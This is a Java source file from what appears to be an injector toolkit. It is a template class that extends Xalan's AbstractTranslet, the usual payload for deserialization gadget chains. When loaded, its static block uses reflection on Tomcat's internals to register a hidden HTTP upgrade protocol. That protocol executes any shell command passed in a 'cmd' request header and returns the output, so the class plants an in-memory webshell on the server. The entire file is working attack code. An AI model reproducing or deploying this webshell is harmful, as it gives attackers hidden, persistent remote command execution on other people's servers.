package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Request;
import org.apache.coyote.*;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.List;

public class TomcatUpgrade extends AbstractTranslet {

    static {
        try {
            String cmdHeader = "cmd";

            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Object target = getField(thread,"target");
                        Object global = null;
                        if (target instanceof Runnable){
                            // 需要遍历其中的 this$0/handler/global
                            // 需要进行异常捕获，因为存在找不到的情况
                            try {
                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
                            } catch (NoSuchFieldException fieldException){
                                fieldException.printStackTrace();
                            }
                        }
                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
                        if (global != null){
                            List processors = (List) getField(global,"processors");
                            for (i=0;i<processors.size();i++){
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null){
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,"req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
//                                    Response response = request.getResponse();
//
//                                    RequestFacade rf = (RequestFacade) ((HttpServletRequest) servletRequest);
//                                    Field requestField = RequestFacade.class.getDeclaredField("request");
//                                    requestField.setAccessible(true);
//                                    Request request1 = (Request) requestField.get(rf);

                                    Field connector = Request.class.getDeclaredField("connector");
                                    connector.setAccessible(true);
                                    Connector realConnector = (Connector) connector.get(request);

                                    Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                                    protocolHandlerField.setAccessible(true);
                                    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

                                    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
                                    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
                                    upgradeProtocolsField.setAccessible(true);
                                    upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

//                                    MyUpgrade myUpgrade = new MyUpgrade();
                                    upgradeProtocols.put("hello", new UpgradeProtocol() {
                                        @Override
                                        public String getHttpUpgradeName(boolean b) {
                                            return null;
                                        }

                                        @Override
                                        public byte[] getAlpnIdentifier() {
                                            return new byte[0];
                                        }

                                        @Override
                                        public String getAlpnName() {
                                            return null;
                                        }

                                        @Override
                                        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
                                            return null;
                                        }

                                        @Override
                                        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {
                                            return null;
                                        }

                                        @Override
                                        public boolean accept(org.apache.coyote.Request request) {
                                            String p = request.getHeader(cmdHeader);
                                            try {
                                                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                                                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                                                response.setAccessible(true);
                                                Response resp = (Response) response.get(request);
                                                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                                                resp.doWrite(ByteBuffer.wrap(result));
                                            } catch (Exception e) {
                                            }
                                            return false;
                                        }
                                    });

                                    upgradeProtocolsField.set(handler, upgradeProtocols);
                                }
                            }
                        }
                    }
                }
                if (flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    public static Object getField(Object obj,String fieldName) throws Exception{
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
